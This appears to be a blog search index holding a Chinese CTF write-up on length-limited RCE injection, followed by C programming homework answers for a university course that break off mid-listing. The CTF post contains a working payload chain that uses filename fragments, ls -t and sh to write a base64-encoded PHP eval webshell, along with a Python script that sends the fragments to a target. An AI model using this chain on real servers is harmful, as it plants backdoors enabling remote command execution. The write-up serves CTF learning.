<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>有长度限制的RCE注入</title>
    <link href="/posts/34863/"/>
    <url>/posts/34863/</url>
    
    <content type="html"><![CDATA[<h1 id="有长度限制的RCE注入"><a href="#有长度限制的RCE注入" class="headerlink" title="有长度限制的RCE注入"></a>有长度限制的RCE注入</h1><h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><h3 id="与"><a href="#与" class="headerlink" title="&gt;与&gt;&gt;"></a><code>&gt;</code>与<code>&gt;&gt;</code></h3><p>我们知道Linux中，有<code>&gt;</code>和<code>&gt;&gt;</code>命令</p><blockquote><ul><li>我们可以通过<code>&gt;</code>来创建新文件</li></ul><p><img src="/posts/34863/image-20231209152729849.png" alt="image-20231209152729849"></p><ul><li>同时<code>&gt;</code>也可以用来往文件存入内容，但是使用<code>&gt;</code>会直接覆盖文件为你需要的内容，如果文件不存在，那么新建文件再放入你需要的内容</li></ul><p><img src="/posts/34863/image-20231209153007009.png" alt="image-20231209153007009"></p><ul><li><p>而<code>&gt;&gt;</code>则是往文件中追加新内容，不会覆盖原文件，同样的如果文件不存在也会新建文件再追加</p><p><img src="/posts/34863/image-20231209153252038.png" alt="image-20231209153252038"></p></li></ul></blockquote><h3 id="多行命令"><a href="#多行命令" class="headerlink" title="多行命令"></a>多行命令</h3><p>同样是在Linux中，我们可以采用在没写完的命令后写入<code>\</code>的方式，实现多行命令</p><p><img src="/posts/34863/image-20231209153724846.png" alt="image-20231209153724846"></p><p>同时我们也可以将命令如上图一样写入文件，并使用<code>sh</code>执行该文件</p><p><img src="/posts/34863/image-20231209154124667.png" alt="image-20231209154124667"></p><ul><li>注意这里要使用<code>&gt;&gt;</code>追加命令</li></ul><h3 id="ls-t"><a href="#ls-t" class="headerlink" title="ls -t"></a><code>ls -t</code></h3><p>Linux中，<code>ls -t</code>可以让文件按照时间进行排序（时间靠后的排在前面）</p><p><img src="/posts/34863/image-20231209154743546.png" alt="image-20231209154743546"></p><p>同时也可以与上述命令构造<code>ls -t &gt; cmd</code></p><p><img src="/posts/34863/image-20231209155053407.png" alt="image-20231209155053407"></p><p>是不是跟<strong>多行命令</strong>中的很像，所以如果我们把文件名写为片段化的命令，就可以用<code>sh</code>来实现执行命令</p><p><img src="/posts/34863/image-20231209155525230.png" alt="image-20231209155525230"></p><p>之所以是<code>\\</code>是因为防止引号转义实际上只有一个<code>\</code>写入</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>访问题目地址</p><p><img src="/posts/34863/image-20231018232631239.png" alt="rce-1"></p><p>观察代码，filter函数中做了过滤，接下来的代码对Get的内容做了长度限制，可以用到我们上面学到的知识</p><p>于是构造一下<code>payload</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]); <span class="hljs-comment"># 需要写入的一句话木马</span><br><br>PD9waHAgZXZhbCgkX0dFVFsxXSk7 <span class="hljs-comment"># base64编码后</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php # 组合一下<br></code></pre></td></tr></table></figure><p>解释一下</p><ul><li><code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7</code> 是一个将Base64编码字符串输出到标准输出的命令</li><li><code>base64 -d</code> 是一个Base64解码的命令。在这里，它将接收前一个命令输出的Base64编码字符串，并解码成原始的二进制数据</li><li><code>&gt; 1.php</code> 将解码后的二进制数据保存到一个名为 <code>1.php</code> 的文件中</li></ul><p>命令挺长的所以我们可以写个脚本来自动执行一下</p><p>payload.txt:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">hp</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">1.p\\</span><br><span class="language-bash">&gt;d\&gt;\\</span><br><span class="language-bash">&gt;\ -\\</span><br><span class="language-bash">&gt;e64\\</span><br><span class="language-bash">&gt;bas\\</span><br><span class="language-bash">&gt;7\|\\</span><br><span class="language-bash">&gt;XSk\\</span><br><span class="language-bash">&gt;Fsx\\</span><br><span class="language-bash">&gt;dFV\\</span><br><span class="language-bash">&gt;kX0\\</span><br><span class="language-bash">&gt;bCg\\</span><br><span class="language-bash">&gt;XZh\\</span><br><span class="language-bash">&gt;AgZ\\</span><br><span class="language-bash">&gt;waH\\</span><br><span class="language-bash">&gt;PD9\\</span><br><span class="language-bash">&gt;o\ \\</span><br><span class="language-bash">&gt;ech\\</span><br><span class="language-bash"><span class="hljs-built_in">ls</span> -t&gt;0</span><br>sh 0<br></code></pre></td></tr></table></figure><p>脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://xxx/?6=&#123;0&#125;&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]start attack!!!&quot;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;payload.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]&quot;</span> + url.<span class="hljs-built_in">format</span>(i.strip()))<br>        requests.get(url.<span class="hljs-built_in">format</span>(i.strip()))<br><br><span class="hljs-comment"># 检查是否攻击成功</span><br>test = requests.get(<br>    <span class="hljs-string">&quot;http://xxx/sandbox/xxxx/1.php&quot;</span><br>)<br><span class="hljs-keyword">if</span> test.status_code == requests.codes.ok:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]Attack success!!!&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>现在访问<code>1.php</code>便可以正常的命令执行了</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UESTC-iCoding-F1</title>
    <link href="/posts/47483/"/>
    <url>/posts/47483/</url>
    
    <content type="html"><![CDATA[<h1 id="UESTC-信软-iCoding-F1-Answer"><a href="#UESTC-信软-iCoding-F1-Answer" class="headerlink" title="[UESTC-信软] iCoding F1 Answer"></a>[UESTC-信软] iCoding F1 Answer</h1><h2 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h2><h3 id="计算税金-Tax"><a href="#计算税金-Tax" class="headerlink" title="计算税金(Tax)"></a>计算税金(Tax)</h3><blockquote><p>编写一个程序，要求用户输入一个美元数量，然后显示出增加 5% 税率后的相应金额。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter an amount: 100.00<br>with tax added: $105.00</p></blockquote><p>输入的金额为大于 0 的两位数浮点数。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">float</span> a;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter an amount: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%f&quot;</span>, &amp;a);<br>    a *= <span class="hljs-number">1.05</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;with tax added: $%.2f&quot;</span>, a);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="计算账单（Bills）"><a href="#计算账单（Bills）" class="headerlink" title="计算账单（Bills）"></a>计算账单（Bills）</h3><blockquote><p>编写⼀个程序，要求用户输出⼀个美元数量，然后显示出如何用最少20美元、10美元、5美元和1美元来付款。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter a dollar amount: 93<br>$20 bills: 4<br>$10 bills: 1<br>$5 bills: 0<br>$1 bills: 3</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> dollar, b, c, d, e;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a dollar amount: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;dollar);<br>    b = dollar / <span class="hljs-number">20</span>;<br>    c = (dollar - b * <span class="hljs-number">20</span>) / <span class="hljs-number">10</span>;<br>    d = (dollar - b * <span class="hljs-number">20</span> - c * <span class="hljs-number">10</span>) / <span class="hljs-number">5</span>;<br>    e = dollar - b * <span class="hljs-number">20</span> - c * <span class="hljs-number">10</span> - d * <span class="hljs-number">5</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;$20 bills: %d\n&quot;</span>, b);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;$10 bills: %d\n&quot;</span>, c);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;$5 bills: %d\n&quot;</span>, d);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;$1 bills: %d\n&quot;</span>, e);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="还贷计算（Loan-Balance）"><a href="#还贷计算（Loan-Balance）" class="headerlink" title="还贷计算（Loan Balance）"></a>还贷计算（Loan Balance）</h3><blockquote><p>编程计算第一、第二、第三个月还贷后剩余的贷款金额。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter amout of loan: 20000.00<br>Enter interest rate: 6.0<br>Enter monthly payment: 386.66</p><p>Balance remaining after first payment: $19713.34<br>Balance remaining after second payment: $19425.25<br>Balance remaining after third payment: $19135.71</p></blockquote><p>提示：每个月的贷款余额减去还款金额后，还需要加上贷款余额与月利率的乘积。月利率的计算方法是把用户输入的利率转换成百分数再除以12。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">float</span> <span class="hljs-title function_">loanCount</span><span class="hljs-params">(<span class="hljs-type">float</span> loan, <span class="hljs-type">float</span> rate, <span class="hljs-type">float</span> payment)</span><br>&#123;<br>    loan = (loan - payment) + loan * rate;<br>    <span class="hljs-keyword">return</span> loan;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">float</span> loan, rate, payment;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter amout of loan: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%f&quot;</span>, &amp;loan);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter interest rate: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%f&quot;</span>, &amp;rate);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter monthly payment: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%f&quot;</span>, &amp;payment);<br>    rate = rate / <span class="hljs-number">100</span> / <span class="hljs-number">12</span>;<br>    loan = loanCount(loan, rate, payment);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Balance remaining after first payment: $%.2f\n&quot;</span>, loan);<br>    loan = loanCount(loan, rate, payment);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Balance remaining after second payment: $%.2f\n&quot;</span>, loan);<br>    loan = loanCount(loan, rate, payment);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Balance remaining after third payment: $%.2f\n&quot;</span>, loan);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="日期格式转化（Date-Format-Convention）"><a href="#日期格式转化（Date-Format-Convention）" class="headerlink" title="日期格式转化（Date Format Convention）"></a>日期格式转化（Date Format Convention）</h3><blockquote><p>编写一个程序，以月&#x2F;日&#x2F;年（即 mm&#x2F;dd&#x2F;yy）的格式接受用户录入的日期信息，并以年月日（即yyyymmdd）的格式将其显示出来。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter a date (mm&#x2F;dd&#x2F;yyyy): 2&#x2F;17&#x2F;2011<br>You entered the date 20110217</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> m, d, y;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a date (mm/dd/yyyy): &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d/%d/%d&quot;</span>, &amp;m, &amp;d, &amp;y);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You entered the date %04d%02d%02d&quot;</span>, y, m, d);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="分数加法（Fraction-Addition）"><a href="#分数加法（Fraction-Addition）" class="headerlink" title="分数加法（Fraction Addition）"></a>分数加法（Fraction Addition）</h3><blockquote><p>修改如下程序，使用户可以同时输入两个分数，中间用加号隔开：</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter two fractions separated by a plus sign: 5&#x2F;6+3&#x2F;4<br>The sum is 38&#x2F;24</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> num1, denom1, num2, denom2, result_num, result_denom;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter two fractions separated by a plus sign: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d/%d+%d/%d&quot;</span>, &amp;num1, &amp;denom1, &amp;num2, &amp;denom2);<br><br>    result_num = num1 * denom2 + num2 * denom1;<br>    result_denom = denom1 * denom2;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The sum is %d/%d\n&quot;</span>, result_num, result_denom);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h2><h3 id="24小时制-12小时制转换-24-hour-to-12-hour"><a href="#24小时制-12小时制转换-24-hour-to-12-hour" class="headerlink" title="24小时制-12小时制转换(24-hour to 12-hour)"></a>24小时制-12小时制转换(24-hour to 12-hour)</h3><blockquote><p>编写一个程序，要求用户输入 24 小时制的时间，将其转换为 12 小时制的格式。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter a 24-hour time: 21:11<br>Equivalent 12-hour time: 9:11 PM</p></blockquote><blockquote><p>Enter a 24-hour time: 0:01<br>Equivalent 12-hour time: 12:01 AM</p></blockquote><p>注意，不要把12:00显示为0:00。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> a, b;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a 24-hour time: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d:%d&quot;</span>, &amp;a, &amp;b);<br>    <span class="hljs-keyword">if</span> (a &gt;= <span class="hljs-number">13</span>)<br>    &#123;<br>        a -= <span class="hljs-number">12</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Equivalent 12-hour time: %d:%02d PM&quot;</span>, a, b);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (a &gt;= <span class="hljs-number">12</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Equivalent 12-hour time: %d:%02d PM&quot;</span>, a, b);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (a &lt; <span class="hljs-number">1</span>)<br>    &#123;<br>        a += <span class="hljs-number">12</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Equivalent 12-hour time: %d:%02d AM&quot;</span>, a, b);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Equivalent 12-hour time: %d:%02d AM&quot;</span>, a, b);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="风速等级与描述（Wind-Speed）"><a href="#风速等级与描述（Wind-Speed）" class="headerlink" title="风速等级与描述（Wind Speed）"></a>风速等级与描述（Wind Speed）</h3><blockquote><p>下面是用于测量风力等级的简化版，编写一个程序，要求用户输入风速（海里&#x2F;小时），然后显示相应的描述。</p><table><thead><tr><th align="center">速率（海里&#x2F;⼩时）</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">小于 1</td><td align="center">Calm（无风）</td></tr><tr><td align="center">1~3</td><td align="center">Light air（轻风）</td></tr><tr><td align="center">4~27</td><td align="center">Breeze（微风）</td></tr><tr><td align="center">28~47</td><td align="center">Gale（⼤风）</td></tr><tr><td align="center">48~63</td><td align="center">Storm（暴风）</td></tr><tr><td align="center">⼤于63</td><td align="center">Hurricane（飓风）</td></tr></tbody></table><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter a wind speed: 1</p><p>Light air</p></blockquote><blockquote><p>Enter a wind speed: 27</p><p>Breeze</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> rate;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a wind speed: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;rate);<br>    <span class="hljs-keyword">if</span> (rate &lt; <span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Calm&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rate &lt;= <span class="hljs-number">3</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Light air&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rate &lt;= <span class="hljs-number">27</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Breeze&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rate &lt;= <span class="hljs-number">47</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Gale&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rate &lt;= <span class="hljs-number">63</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Storm&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hurricane&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="通用产品代码（UPC-Universal-Production-Code）"><a href="#通用产品代码（UPC-Universal-Production-Code）" class="headerlink" title="通用产品代码（UPC, Universal Production Code）"></a>通用产品代码（UPC, Universal Production Code）</h3><blockquote><p>修改如下程序，使其可以检测 UPC 的有效性。在用户输入UPC后，程序将输出 VALID 或 NOT VALID 。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter the first (single) digit: 0<br>Enter first group of five digits: 13800<br>Enter second group of five digits: 15173<br>Enter the last (single) digit: 5<br>VALID</p></blockquote><blockquote><p>Enter the first (single) digit: 0<br>Enter first group of five digits: 51500<br>Enter second group of five digits: 24128<br>Enter the last (single) digit: 7<br>NOT VALID</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* upc.c</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Computes a universal product code check digit</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> d, i1, i2, i3, i4, i5, j1, j2, j3, j4, j5, first_sum, second_sum, total, check;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the first (single) digit:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%1d&quot;</span>, &amp;d);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the first group of five digits:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%1d%1d%1d%1d%1d&quot;</span>, &amp;i1, &amp;i2, &amp;i3, &amp;i4, &amp;i5);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the second group of five digits:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%1d%1d%1d%1d%1d&quot;</span>, &amp;j1, &amp;j2, &amp;j3, &amp;j4, &amp;j5);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the last (single) digit: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;check);<br>    first_sum = d + i2 + i4 + j1 + j3 + j5;<br>    second_sum = i1 + i3 + i5 + j2 + j4;<br>    total = <span class="hljs-number">3</span> * first_sum + second_sum;<br><br>    check == <span class="hljs-number">9</span> - ((total - <span class="hljs-number">1</span>) % <span class="hljs-number">10</span>) ? <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;VALID\n&quot;</span>) : <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NOT VALID\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="将百分制转换为等级制（Centesimal-grade-to-Letter-grade）"><a href="#将百分制转换为等级制（Centesimal-grade-to-Letter-grade）" class="headerlink" title="将百分制转换为等级制（Centesimal-grade to Letter-grade）"></a>将百分制转换为等级制（Centesimal-grade to Letter-grade）</h3><blockquote><p>利用switch语句编写一个程序，把用数字表示的成绩转化为字母表示的等级。</p><p>使用下面的等级评定规则：A为90<del>100，B为80</del>89，C为70<del>79，D为60</del>69，F为0~59。如果成绩大于100或小于0显示出错信息。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter numerical grade: 84<br>Letter grade: B</p></blockquote><blockquote><p>Enter numerical grade: -1<br>Error, grade must be between 0 and 100.</p></blockquote><p>提示：把成绩拆分成 2 个数字，然后使用 switch 语句判定十位上的数字。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 